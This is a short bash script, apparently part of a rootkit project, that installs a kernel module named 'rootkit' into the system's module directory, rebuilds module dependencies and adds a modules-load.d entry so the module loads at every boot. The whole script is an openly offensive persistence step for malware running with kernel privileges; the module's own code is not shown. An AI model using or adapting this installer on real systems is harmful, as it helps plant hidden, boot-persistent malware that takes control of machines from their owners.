#!/bin/bash

NAME="rootkit"
DIR="/lib/modules/`uname -r`/kernel/drivers/$NAME/"

sudo mkdir -p $DIR
sudo cp $NAME.ko $DIR
sudo depmod
sudo bash -c 'cat << EOF > /etc/modules-load.d/rootkit.conf
rootkit
EOF'


